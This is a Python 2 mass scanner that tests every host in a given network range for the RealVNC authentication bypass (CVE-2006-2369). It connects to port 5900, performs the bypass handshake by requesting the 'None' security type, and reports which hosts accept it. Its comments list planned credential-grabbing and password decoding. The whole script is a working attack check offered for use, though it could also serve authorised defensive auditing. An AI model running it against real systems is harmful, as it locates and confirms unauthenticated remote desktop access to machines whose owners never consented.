# RealVNC Authentication Bypass (CVE-2006-2369) Scanner
# =====================================================
# A Vulnerability Scanner that tests a host for RealVNC
# Authentication Bypass Vulnerability (CVE-2006-2369). 
# This script takes a CIDR notation and scans all hosts
# and outputs in a script friendly format to indicate
# if a host was found to be vulnerable to the issue.
#
# Future improvements:
# * Do a brute force/weak password check.
# * Check for other known VNC vulnerabilites.
# * Support grabbing Registry pass w/creds.
# * Support VNC password decoding
#
# - Hacker Fantastic
import socket 
import struct
import threading
import time
import Queue
import sys, re

THREADS = 100
scanPool = Queue.Queue(0)

class Scanner(threading.Thread):
    def run(self):
	socket.setdefaulttimeout(3)
	while True:
		sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		host = scanPool.get()
            	try:
        	        sd.connect((host, 5900))
            	except socket.error:
			print "%s:5900:CLOSED" % host
           	else:
			#error handling isnt brilliant here. can throw exception.
			try:
				vulnerable = ""
				hello = sd.recv(12)
				hello = hello[:-1]
				sd.send("RFB 003.008\n")
				result = sd.recv(2)
				if result == "\x01\x02":
					try:
						sd.send("\x01")
						result = sd.recv(4)
						if result == "\x00\x00\x00\x00":
							vulnerable = "VULNERABLE"
							sd.close()
						else:
							sd.close()
					except socket.error:
						vulnerable = ""
			except socket.error:
				vlunerable = ""
			print "%s:5900:OPEN:%s" % (host,vulnerable)
               		sd.close()
		scanPool.task_done()
		
def ip2bin(ip):
    b = ""
    inQuads = ip.split(".")
    outQuads = 4
    for q in inQuads:
        if q != "":
            b += dec2bin(int(q),8)
            outQuads -= 1
    while outQuads > 0:
        b += "00000000"
        outQuads -= 1
    return b

def dec2bin(n,d=None):
    s = ""
    while n>0:
        if n&1:
            s = "1"+s
        else:
            s = "0"+s
        n >>= 1
    if d is not None:
        while len(s)<d:
            s = "0"+s
    if s == "": s = "0"
    return s

def bin2ip(b):
    ip = ""
    for i in range(0,len(b),8):
        ip += str(int(b[i:i+8],2))+"."
    return ip[:-1]

def scanCIDR(c):
    	parts = c.split("/")
    	baseIP = ip2bin(parts[0])
    	subnet = int(parts[1])
    	if subnet == 32:
		Scanner().start()
    		scanPool.put(bin2ip(baseIP))
		scanPool.join()
		print "Done."
		quit()
    	else:
		for x in xrange(THREADS):
			Scanner().start()
    		ipPrefix = baseIP[:-(32-subnet)]
    		for i in range(2**(32-subnet)):
    			scanPool.put(bin2ip(ipPrefix+dec2bin(i, (32-subnet))))
		scanPool.join()
		print "Done."
		quit()

def validateCIDRBlock(b):
    p = re.compile("^([0-9]{1,3}\.){0,3}[0-9]{1,3}(/[0-9]{1,2}){1}$")
    if not p.match(b):
        print "Error: Invalid CIDR format!"
        return False
    prefix, subnet = b.split("/")
    quads = prefix.split(".")
    for q in quads:
        if (int(q) < 0) or (int(q) > 255):
            print "Error: quad "+str(q)+" wrong size."
            return False
    if (int(subnet) < 1) or (int(subnet) > 32):
        print "Error: subnet "+str(subnet)+" wrong size."
        return False
    return True

def printUsage():
    print "Use the force."

def main():
    try:
        cidrBlock = sys.argv[1]
    except:
        cidrBlock = raw_input("Please input a CIDR range to scan:")
    if not validateCIDRBlock(cidrBlock):
        printUsage()
    else:
        scanCIDR(cidrBlock)

if __name__ == "__main__":
	main()

